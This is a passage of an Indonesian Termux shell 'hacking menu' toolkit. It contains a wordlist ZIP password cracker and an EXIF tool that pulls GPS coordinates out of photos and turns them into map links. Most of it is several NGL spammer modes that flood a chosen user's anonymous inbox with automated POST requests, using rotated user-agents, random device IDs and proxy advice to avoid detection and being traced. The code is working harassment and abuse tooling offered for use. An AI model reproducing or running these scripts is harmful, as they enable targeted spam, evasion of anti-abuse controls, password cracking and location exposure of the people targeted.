⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
 ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
 ⠀⠀⠈⠒⠹⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠁ " | lolcat 
echo ""
echo -e "${p}  Development ${g}: ${c}By.Thxyzz404"
echo -e "${g}"
read -p "Masukkan file zip : " zipfile
echo -e "${y}"
read -p "Masukkan wordslit file anda : " wordlist
echo ""
[[ -z "$wordlist" ]] && wordlist="pass.txt"
if [[ ! -f "$zipfile" ]]; then
    echo -e "${r}[ ${g}X ${r}]${c} File ZIP tidak ditemukan..!!"
    echo ""
fi
if [[ ! -f "$wordlist" ]]; then
    echo -e "${r}[ ${g}X ${r}]${c} Wordlist tidak ditemukan..!!"
    echo ""
fi
words=$(wc -l < "$wordlist")
echo -e "${b}Cracking password please wait..!!"
echo ""
count=0
while IFS= read -r pass; do
    count=$((count + 1))
    echo -ne "\r${c}[ ${r}$count/$words ${c}]${y} Trying ${c}: ${g}$pass"
    unzip -P "$pass" -t "$zipfile" &>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "\n\e[31m"
        figlet -f digital Cracked
        echo ""
        echo -e "${b}[ ${r}✓ ${b}]${y} Sukses password : $pass"
        echo ""
        pkill -9 -f com.termux
    fi
done < "$wordlist"
echo -e "${n}[ ${r}X ${n}]${g} Password not found, try another wordlist..!!"
echo ""
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "19" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
p='\033[35;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
if ! command -v exiftool &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Exiftool belum terinstall, sedang menginstall..!!"
    echo ""
    sleep 3 
    pkg install exiftool -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Exiftool sudah terinstall."
    echo ""
    sleep 3 
fi
clear 
echo "
▗▄▄▄▖ ▗▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌
▐▛▀▀▘▐▌ ▐▌ █ ▐▌ ▐▌ ▝▀▚▖▐▌   ▐▛▀▜▌▐▌ ▝▜▌
▐▌   ▝▚▄▞▘ █ ▝▚▄▞▘▗▄▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      Developer : Thxyzz404" | lolcat 
echo -e "${c}"
read -p "Masukkan path gambar : " filepath
echo ""
if [ ! -f "$filepath" ]; then
    echo -e "${r}Error file tidak ditemukan : $filepath"
    sleep 5
    echo ""
    clear 
fi
clear
echo ""
echo -e "${c}==============================================${n}"
echo "         Developer : Thxyzz404" | lolcat 
echo -e "${c}==============================================${n}"
echo -e "${r}
  ⢀⣴⣿⣷⣦⡀                      
 ⢠⣿⣿⢿⣿⣿⣷⣄${c} S ${n}                   
⢀${b}⡾⠋ ⣰⣿⣿⠻⣿⣷⡀${y} C ${n}                 
⠘  ⢠⣿⣿⠃ ⠈⠻⣿⣦⡀${r} A ${n}               
  ${p} ⢸⣿⡇   ⣼⣉⣿⣷⣄ ${b} N ${n}         ⢀⣀⣀ 
${g}   ⢹⣿⡇   ⣿⣿⣿⣿⣿⣷⡄        ⢀⣴⠟⣿⠉⠁
   ⠸⣿⣿⣄  ⠘⢿⣿⡵⠋⠙⢿⣦⡀  ⣤⣠ ⣠⣿⡅ ⣿  
    ⠈${y}⠻⢿⣿⣶⣤⣄⣀   ⠈⠻⣷⣄⣠⣿⣿⡼⠋⠛⣡⡼⠋  
        ⠉⠛⠛⠻⠿⠿⠷⠶⠶⠾⣿⡿⠋⠻⣟⠉⠁     
               ⢀⡠⠶⠋           
" ⠀⠀⠀
echo -e "${c}==============================================${n}"
echo -e "${y}         📸 AUTO INFORMASI DETAIL 📸 "
echo -e "${c}==============================================${n}"
echo ""
fname=$(exiftool -s -s -s -FileName "$filepath")
fsize=$(exiftool -s -s -s -FileSize "$filepath")
make=$(exiftool -s -s -s -Make "$filepath")
model=$(exiftool -s -s -s -Model "$filepath")
iso=$(exiftool -s -s -s -ISO "$filepath")
flash=$(exiftool -s -s -s -Flash "$filepath")
focal=$(exiftool -s -s -s -'FocalLengthIn35mmFormat' "$filepath")
aperture=$(exiftool -s -s -s -ApertureValue "$filepath")
maxap=$(exiftool -s -s -s -MaxApertureValue "$filepath")
date=$(exiftool -s -s -s -CreateDate "$filepath")
wb=$(exiftool -s -s -s -WhiteBalance "$filepath")
mp=$(exiftool -s -s -s -Megapixels "$filepath")
imgsize=$(exiftool -s -s -s -ImageSize "$filepath")
gps=$(exiftool -s -s -s -GPSPosition "$filepath")
echo -e "${g}File Name ${n}: ${p}$fname${n}"
echo -e "${g}File Size ${n}: ${p}$fsize${n}"
echo -e "${g}Make ${n}: ${p}$make${n}"
echo -e "${g}Camera Model Name ${n}: ${p}$model${n}"
echo -e "${g}ISO ${n}: ${p}$iso${n}"
echo -e "${g}Flash ${n}: ${p}$flash${n}"
echo -e "${g}Focal Length In 35mm Format ${n}: ${p}$focal${n}"
echo -e "${g}Max Aperture Value ${n}: ${p}$maxap${n}"
echo -e "${g}Create Date ${n}: ${p}$date${n}"
echo -e "${g}White Balance ${n}: ${p}$wb${n}"
echo -e "${g}Aperture Value ${n}: ${p}$aperture${n}"
echo -e "${g}Image Size ${n}: ${p}$imgsize${n}"
echo -e "${g}Megapixels ${n}: ${p}$mp${n}"
echo -e "${g}GPS Position ${n}: ${p}$gps${n}"
echo ""
echo -e "${c}==============================================${n}"
echo ""
lat=$(exiftool -gpslatitude -n "$filepath" | awk -F': ' '/GPS Latitude/ {print $2}')
lon=$(exiftool -gpslongitude -n "$filepath" | awk -F': ' '/GPS Longitude/ {print $2}')
if [[ -z "$lat" || -z "$lon" ]]; then
    echo -e "${r}Lokasi GPS tidak ditemukan di metadata gambar.${n}"
    sleep 5
    echo ""
    clear 
fi
echo -e "${r}[ ${g}✓ ${r}]${y} Lokasi ditemukan:${n}"
echo ""
echo -e "${g}Latitude  ${n}: ${p}$lat${n}"
echo -e "${g}Longitude ${n}: ${p}$lon${n}"
echo ""
echo -e "${g}🔗 Link Google Maps:${n}"
echo -e "${c}https://www.google.com/maps?q=$lat,$lon${n}"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "20" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
echo ""
echo -e "${c}🤖 Telegram Get ID "
echo -e "${n}========================"
echo -e "${g}"
read -p "🔑 Masukkan Bot Token : " token
echo ""
echo -e "${y}📦 Installing dependencies..!!"
pip install python-telegram-bot==21.10 > /dev/null 2>&1
echo ""
echo -e "${g}📋 Summary"
echo -e "${y}• Bot Token : $token"
echo -e "${p}"
read -p "🎯 Jalankan bot sekarang? (y/n) : " jawab
if [[ $jawab == "y" || $jawab == "Y" ]]; then
    echo ""
    echo -e "${g}"   
    python3 -c "
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
BOT_TOKEN = '$token'
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f'🤖 <b>Botz Cek ID</b>\n\n'
        f'👋 Hai {user.first_name}!\n'
        f'💡 Gunakan /id untuk lihat ID',
        parse_mode='HTML'
    )
async def show_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = f'🆔 <b>ID Kamu :</b> <code>{user.id}</code>\n'
    text += f'👤 <b>Nama :</b> {user.first_name}\n'
    text += f'📱 <b>Username :</b> @{user.username or \"tidak ada\"}\n'
    await update.message.reply_text(text, parse_mode='HTML')
def main():
    print('🤖 Botz Starting..!!')
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler('start', start))
        app.add_handler(CommandHandler('id', show_id))
        print('🚀 Bot aktif! Buka Telegram dan chat ke botmu!')
        app.run_polling()
    except Exception as e:
        print(f'❌ ERROR : {e}')
if __name__ == '__main__':
    main()
"
else
    echo ""
    echo -e "${g}💡 Tidak jadi menjalankan bot."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "21" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
URL="https://play.google.com/store/apps/details?id=com.fast.free.unblock.thunder.vpn"
open_url() {
  if command -v termux-open >/dev/null 2>&1; then
    termux-open "$URL"
  elif command -v xdg-open >/dev/null 2>&1; then
    xdg-open "$URL" >/dev/null 2>&1
  elif command -v am >/dev/null 2>&1; then
    am start -a android.intent.action.VIEW -d "$URL" >/dev/null 2>&1
  fi
}
clear
echo ""
echo -e "${bold_bg}${bold_gren} PERINGATAN PENTING ${n}"
echo ""
echo -e "${c} 
Jika anda menggunakan proxy,
ketika menyerang akan lebih aman,
karena jamanya skrg sudah ada ngl mods yg bisa 
menampilkan alamat ip lokasi rumah kalian, nah itu 
manfaatnya agar kalian terhindar dari
ngl mods ketika kalian sudah menggunakan proxy ataupun
anda sudah mendownload proxy punya saya dan siap 
untuk meluncurkan penyerangan kepada target usernamenya,
semoga bermanfaat dan senang saya membantu anda.
"
echo -e "${g}"
read -p "Apakah anda ingin menggunakan proxy? [y/n] : " answer
case "$answer" in
  y|Y)
    clear
    echo ""
    echo -e "${bold_bg}${bold_gren} MEMBUKA PROXY DARI LINK..!! ${n}"
    sleep 2
    open_url
    echo -e "${g}"
    read -n 1 -s -r -p "SILAHKAN TEKAN ENTAR UNTUK MELANJUTKANNYA."
    clear
    ;;
  n|N)
    clear 
    echo ""
    echo -e "${bold_bg}${bold_gren} ANDA MEMILIH TIDAK MENGGUNAKAN PROXY. ${n}"
    sleep 3 
    clear
    ;;
  *)
    clear 
    echo ""
    echo -e "${r}Jawaban anda tidak valid tidak memilih apapun..!!"
    sleep 4
    clear
    ;;
esac
clear
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
" | lolcat
echo -e "${r}=============================="
echo -e "${g}   SPAMMER NGL THXYZZ404"
echo -e "${r}=============================="
echo ""
echo -e "${r} [ ${g}01 ${r}]${c} SPAMMER NGL BRUTAL."
echo -e "${r} [ ${g}02 ${r}]${c} SPAMMER NGL SLOW."
echo -e "${r} [ ${g}03 ${r}]${c} SPAMMER NGL KENCANG."
echo -e "${r} [ ${g}04 ${r}]${c} SPAMMER NGL SEDANG."
echo -e "${r} [ ${g}05 ${r}]${y} Kembali ke awal."
echo ""
echo -e "${r}=============================="
echo -e "${p}"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
read -p "Masukkan Pilihan Anda : " kuy
case $kuy in
 1|01)
ua_url="https://raw.githubusercontent.com/QrwszXnXnchommed0e56/ua/main/ua.txt"
clear
echo ""
echo "
░███    ░██   ░██████  ░██         
░████   ░██  ░██   ░██ ░██         
░██░██  ░██ ░██        ░██         
░██ ░██ ░██ ░██  █████ ░██         
░██  ░██░██ ░██     ██ ░██         
░██   ░████  ░██  ░███ ░██         
░██    ░███   ░█████░█ ░██████████
" | lolcat                                                          
echo -e "${p}Development ${c}: ${y}Thxyzz404 & HanX"
echo ""
read -p "$(echo -e "${y}Masukkan${r} [ ${g}Username Ngll Atau Link Ngll ${r}]${c} : ")" input
echo ""
read -p "$(echo -e "${g}Masukkan Pesan Yang Ingin Dikirim${c} : ")" pesan
echo -e "${r}"
read -p "Masukkan Jumlah Spam : " jumlah
echo ""
echo -e "${g}Sedang Proses Spam..!!"
echo ""
username=$(echo "$input" | sed 's|https://ngl\.link/||')
ua_list=($(curl -s "$ua_url"))
if [ ${#ua_list[@]} -eq 0 ]; then
    clear
    echo ""
    echo -e "${r}Gagall Mengambil User-Agent Dari : $ua_url"
    echo ""
    pkill -9 -f com.termux
fi
for ((i=1; i<=jumlah; i++)); do
    ua=${ua_list[$RANDOM % ${#ua_list[@]}]}
    curl -s -X POST "https://ngl.link/api/submit" \
        -H "User-Agent: $ua" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&question=$pesan&deviceId=$(hexdump -n 16 -e '4/4 "%08X" 1 "\n"' /dev/urandom)" \
        > /dev/null
    echo -e "${r}[ ${g}$i ${r}]${c} Spam Terkirim Ke : ${p}@$username: $pesan"
    echo ""
    sleep 1
done
;;
 2|02)
clear
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
RESET="\033[0m"
pesanlist=(
    "Halo!"
    "Apa kabar?"
    "Kamu keren banget!"
    "Semangat terus ya!"
    "Test 123"
    "Gimana hari ini?"
    "Kamu hebat!"
    "Tetap semangat!"
    "Selamat pagi!"
    "Jangan lupa makan ya!"
    "Lagi ngapain?"
    "Senyum dulu dong :)"
    "Keep fighting!"
    "Kamu pasti bisa!"
    "Yakin aja!"
    "Kabarin aku dong hehe"
    "Santai aja ya"
    "Napas dulu, slow"
    "Minum air putih!"
    "Udah tidur cukup?"
    "Hari ini indah kan?"
    "Tetap waras!"
    "Jangan menyerah"
    "Aku bangga sama kamu"
    "Istirahat yang cukup ya"
    "Udh makan belum?"
    "Jangan terlalu keras ke diri sendiri"
    "Hari ini luar biasa"
    "Fokus terus!"
    "Kamu gak sendiri"
    "Bernafas dulu yuk"
    "Senyumanmu berharga"
    "Langit cerah hari ini"
    "Nikmati prosesnya"
    "Take a deep breath"
    "Lihat ke cermin dan senyum"
    "Tetap jadi diri sendiri"
    "Hidup itu indah"
    "Dunia menunggumu bersinar"
    "Aku di sini kok"
    "Percaya proses"
    "Pelan-pelan aja"
    "Selangkah lebih dekat"
    "Good vibes only"
    "Kamu layak bahagia"
    "Yuk bangkit lagi"
    "No pressure, just do it"
    "Reset, recharge, restart"
    "Fokus ke hari ini"
    "Hari buruk bukan akhir segalanya"
    "Tiap hari kesempatan baru"
    "Jangan terlalu mikir"
    "Kebahagiaan itu sederhana"
    "Kamu punya potensi"
    "Semua akan indah pada waktunya"
    "You got this!"
    "Ngopi dulu yuk"
    "Tenang, semua akan baik-baik saja"
    "Udah sholat belum?"
    "Dengerin musik kesukaanmu"
    "Lihat langit sore yuk"
    "Hidup itu bukan lomba"
    "Ada aku kok"
    "Mau curhat gak?"
    "Kamu lucu juga ya"
    "Hari ini kamu senyum gak?"
    "Bersyukur dulu yuk"
    "Masih banyak yang sayang kamu"
    "Hidup gak harus selalu serius"
    "Ayo, semangat semangat!"
    "Mimpi itu gratis, kejar yuk"
    "Ga semua harus sempurna"
    "Kamu luar biasa"
    "Ajak temanmu senyum juga"
    "Hidup terus berjalan"
    "Buka jendela, tarik napas"
    "Peluk diri sendiri yuk"
    "Kamu bukan gagal, kamu belajar"
    "Ngambek ya?"
    "Waktunya healing"
    "Jangan bandingkan dirimu"
    "Sedih boleh, lama jangan"
    "Cinta diri sendiri"
    "Aku percaya kamu"
    "Mau pelukan virtual?"
    "Berjalanlah perlahan"
    "Semangat, pejuang hidup!"
    "Pakai sunscreen ya"
    "Jangan stalking terus wkwk"
    "Tidur cukup penting loh"
    "Jangan insecure ya"
    "Senyum kamu manis"
    "Terus belajar ya"
    "Bahagia itu pilihan"
    "Kamu tidak gagal"
    "Beristirahat bukan lemah"
    "Doa adalah kekuatan"
    "Kamu istimewa"
    "Yuk lanjut lagi"
    "Gagal bukan akhir"
    "Kamu patut diperjuangkan"
    "Jangan simpan semua sendiri"
    "Aku support kamu"
    "Hari ini indah, seperti kamu"
)
banner() {
    echo -e "${CYAN}
███╗   ██╗ ██████╗ ██╗     
████╗  ██║██╔════╝ ██║     
██╔██╗ ██║██║  ███╗██║     
██║╚██╗██║██║   ██║██║     
██║ ╚████║╚██████╔╝███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ Spammer !
    ${RESET}"
}
cek_username() {
    local uname="$1"
    result=$(curl -s -o /dev/null -w "%{http_code}" "https://ngl.link/$uname")
    if [[ "$result" == "200" ]]; then
        return 0
    else
        return 1
    fi
}
clear
banner
IFS= read -r -e -p "🔹 Masukkan username (pisahkan dengan koma): " input_username
IFS=',' read -ra username_list <<< "$input_username"
valid_usernames=()
for uname in "${username_list[@]}"; do
    uname_clean=$(echo "$uname" | xargs)
    if cek_username "$uname_clean"; then
        valid_usernames+=("$uname_clean")
    else
        echo -e "${RED}✖ Username \"$uname_clean\" tidak valid. Lewati.${RESET}"
    fi
done
if [[ ${#valid_usernames[@]} -eq 0 ]]; then
    echo -e "${RED}✖ Tidak ada username valid. Keluar.${RESET}"
    sleep 5
fi
total=0
loading() {
    echo -ne "${YELLOW}⏳ Mengirim"
    for i in {1..3}; do
        echo -n "."
        sleep 0.2
    done
    echo -ne "\r                                     \r"
}
while true; do
    clear
    banner
    echo
    echo -e "${BLUE}Pilih mode pesan:${RESET}"
    echo -e "${CYAN}1)${RESET} Mode otomatis (acak terus-menerus)"
    echo -e "${CYAN}2)${RESET} Tulis pesan manual"
    echo -e "${CYAN}q)${RESET} Keluar"
    echo
    IFS= read -r -e -p "🔸 Pilihan : " mode
    if [[ "$mode" == "q" ]]; then
        echo -e "${YELLOW}Keluar...${RESET}"
        break
    fi
    case "$mode" in
        1)
 berhasil=0
            gagal=0
            berhasil_list=()
            gagal_list=()
            stty -echo -icanon time 0 min 0
            while true; do
                clear
                banner
                echo -e "${CYAN}🌀 Mode otomatis aktif (tekan 'q' untuk berhenti)${RESET}"
                key=$(dd bs=1 count=1 2>/dev/null)
                if [[ "$key" == "q" ]]; then
                    echo -e "${YELLOW}➡️  Dihentikan oleh user (tekan q). Menampilkan ringkasan...${RESET}"
                    break
                fi
                for user in "${valid_usernames[@]}"; do
                    ((total++))
                    pesan="${pesanlist[$RANDOM % ${#pesanlist[@]}]}"
                    device_id=$(cat /proc/sys/kernel/random/uuid | tr 'A-Z' 'a-z')
                    loading
                    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://ngl.link/api/submit" \
                        -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
                        -H "Origin: https://ngl.link" \
                        -H "Referer: https://ngl.link/$user" \
                        --data-urlencode "username=$user" \
                        --data-urlencode "question=$pesan" \
                        --data-urlencode "deviceId=$device_id" \
                        --data-urlencode "gameSlug=" \
                        --data-urlencode "referrer=")
                    if [[ "$response" == "200" ]]; then
                        ((berhasil++))
                        berhasil_list+=("[$total] @$user: $pesan")
                        echo -e "${GREEN}✅ [$total] Sukses ke @$user: \"$pesan\"${RESET}"
                    else
                        ((gagal++))
                        gagal_list+=("[$total] @$user: $pesan (Status: $response)")
                        echo -e "${RED}❌ [$total] Gagal ke @$user: \"$pesan\" (Status: $response)${RESET}"
                    fi
                done

                sleep 0.3
            done
            stty sane
            echo
            echo -e "${CYAN}📊 RINGKASAN PENGIRIMAN:${RESET}"
            echo -e "${GREEN}✔️ Berhasil: $berhasil${RESET}"
            echo -e "${RED}❌ Gagal: $gagal${RESET}"
            echo -e "${YELLOW}📦 Total: $total${RESET}"
            echo
            if [[ $berhasil -gt 0 ]]; then
                echo -e "${GREEN}✅ Daftar pesan berhasil:${RESET}"
                for msg in "${berhasil_list[@]}"; do
                    echo -e "   ${GREEN}$msg${RESET}"
                done
            fi
            if [[ $gagal -gt 0 ]]; then
                echo -e "${RED}❌ Daftar pesan gagal:${RESET}"
                for msg in "${gagal_list[@]}"; do
                    echo -e "   ${RED}$msg${RESET}"
                done
            fi
            echo
            echo -e "${BLUE}🔚 ENTER untuk kembali ke menu${RESET}"
            read
            ;;
        2)
            clear
banner
IFS= read -r -e -p "✏️  Ketik pesan (atau 'q' untuk keluar): " pesan
if [[ "$pesan" == "q" ]]; then
    echo -e "${YELLOW}Keluar...${RESET}"
    exit 0
fi
if [[ -z "$pesan" ]]; then
    echo -e "${RED}⚠️  Pesan kosong. Keluar...${RESET}"
    exit 0
fi
while true; do
clear
banner
    for user in "${valid_usernames[@]}"; do
        ((total++))
        device_id=$(cat /proc/sys/kernel/random/uuid | tr 'A-Z' 'a-z')
        loading
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://ngl.link/api/submit" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -H "Origin: https://ngl.link" \
            -H "Referer: https://ngl.link/$user" \
            --data-urlencode "username=$user" \
            --data-urlencode "question=$pesan" \
            --data-urlencode "deviceId=$device_id" \
            --data-urlencode "gameSlug=" \
            --data-urlencode "referrer=")
        if [[ "$response" == "200" ]]; then
            echo -e "${GREEN}✅ [$total] Sukses ke @$user: \"$pesan\"${RESET}"
        else
            echo -e "${RED}❌ [$total] Gagal ke @$user: \"$pesan\" (Status: $response)${RESET}"
        fi
    done
    read -t 1 -p "⏳ Tekan 'q' untuk stop " stop
    if [[ "$stop" == "q" ]]; then
        echo -e "${YELLOW}Loop dihentikan...${RESET}"
        break
    fi
done
;;
*)
echo -e "${RED}✖ Pilihan tidak valid.${RESET}"
sleep 5
;;
esac
done
;;
 3|03)
clear
if ! command -v ruby &> /dev/null; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Installing ruby..!!${g}"
        sleep 2 
        echo -e "${n}"
        pkg install ruby 
    else
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} ruby sudah terinstall.${g}"
        sleep 2 
    fi
if ! command -v lolcat &> /dev/null; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Installing lolcat (via gem)..!!${g}"
        sleep 2 
        echo -e "${n}"
        gem install lolcat
    else
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} lolcat sudah terinstall.${g}"
        sleep 2 
    fi
BANNER=(
"╔════════════════════════════════════════╗"
"║                                        ║"
"║  ███╗   ██╗ ██████╗ ██╗                ║"
"║  ████╗  ██║██╔════╝ ██║                ║"
"║  ██╔██╗ ██║██║  ███╗██║                ║"
"║  ██║╚██╗██║██║   ██║██║                ║"
"║  ██║ ╚████║╚██████╔╝███████╗           ║"
"║  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝           ║"
"║                                        ║"
"║  NGL Spammer - Thxyzz404 & Junz        ║"
"║                                        ║"
"╚════════════════════════════════════════╝"
)
animate_banner() {
    clear
    echo -e "\n\n"
    for line in "${BANNER[@]}"; do
        echo -e "$line"
        sleep 0.08
    done
    echo -e "\n\n"
}
show_progress() {
    local current=$1
    local total=$2
    local width=30
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    local remaining=$((width - completed))
    printf "\r${c}[ ${n}"
    printf "${g}%*s${n}" "$completed" "" | tr ' ' '>'
    printf "%*s" "$remaining" ""
    printf "${c} ] ${y}%d%%${n} ${c}(%d/%d)${n}" "$percentage" "$current" "$total"
}
random_device_id() {
    cat /dev/urandom | tr -dc 'a-z0-9' | head -c 16
}
send_message() {
    local username=$1
    local message=$2
    local index=$3
    local total=$4
    local device_id
    device_id=$(random_device_id)
    local url="https://ngl.link/api/submit"
    local data="{\"username\":\"$username\",\"question\":\"$message\",\"deviceId\":\"$device_id\"}"
    local response_code
    show_progress $((index + 1)) "$total"
    response_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "$data" "$url" 2>/dev/null)
    if [[ $response_code -eq 200 ]]; then
        return 0
    else
        return 1
    fi
}
validate_number() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan jumlah target ${r}[ ${g}contoh : 250 ${r}]${c} : ")" input
        if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -gt 0 ]; then
            echo "$input"
            return 0
        else
            echo -e "${r}❌ Harap masukkan angka positif yang valid"
        fi
    done
}
validate_username() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan ngl target ${r}[ ${g}contoh : user/link ${r}]${c} : ")" input
        if [ -n "$input" ]; then
            if [[ "$input" =~ ^https?://ngl\.link/(.+)$ ]]; then
                username="${BASH_REMATCH[1]}"
                username=$(echo "$username" | cut -d'/' -f1)
                echo "$username"
                return 0
            elif [[ "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                echo "$input"
                return 0
            else
                echo -e "${r}❌ Input tidak valid. Masukkan username NGL atau link yang valid (contoh: https://ngl.link/username atau username)"
            fi
        else
            echo -e "${r}❌ Kolom ini tidak boleh kosong"
        fi
    done
}
validate_text() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan pesan untuk ngl ${r}[ ${g}contoh : woi_kon ${r}]${c} : ")" input
        if [ -n "$input" ]; then
            echo "$input"
            return 0
        else
